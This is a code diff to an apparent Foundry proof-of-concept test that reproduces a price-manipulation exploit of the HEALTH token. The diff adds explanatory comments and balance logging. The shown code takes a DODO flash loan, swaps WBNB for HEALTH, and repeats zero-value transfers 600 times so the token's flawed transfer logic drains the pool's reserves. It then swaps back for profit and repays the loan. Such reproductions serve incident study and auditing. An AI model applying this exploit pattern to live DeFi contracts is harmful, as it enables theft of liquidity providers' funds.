@@ -34,13 +34,33 @@ contract ContractTest is DSTest{
         );
     }
 
+    // IDODOCallee methods
+    // DPPFlashLoanCall
     function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external{
 
+        //  swap 40 WBNB(flashloan) for 31839221.11 HEALTH
+        uint256 hBalanceBefore = HEALTH.balanceOf(address(this));
+
         WBNBToHEALTH();
+        // transfer 0 to to 
+        emit log_named_decimal_uint("hBalanceBefore", hBalanceBefore, 18);
         for(uint i = 0; i < 600; i++){
+            // everytime transfer from HEALTH contract triggered, sub HEALTH from uniswapV2Pair contract
+            // decrease HEALTH in HEALTH/WBNB pair of uniswapV2Pair
+            // meaning: 1 HEALTH equals more WBNB 
+            // the attacker again swap HEALTH to WBNB to get more WBNB
+            // ref: HEALTH _transfer function 
             HEALTH.transfer(address(this), 0);
         }
+
+        uint256 hBalanceAfter = HEALTH.balanceOf(address(this));
+        emit log_named_decimal_uint("hBalanceAfter", hBalanceAfter, 18);
+
+
+        // swap back to BNB
         HEALTHToWBNB();
+
+        // pay back flash loan
         WBNB.transfer(dodo, 200 * 1e18);
     }
 
@@ -48,6 +68,7 @@ contract ContractTest is DSTest{
         address[] memory path = new address[](2);
         path[0] = address(WBNB);
         path[1] = address(HEALTH);
+
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
             WBNB.balanceOf(address(this)),
             0,
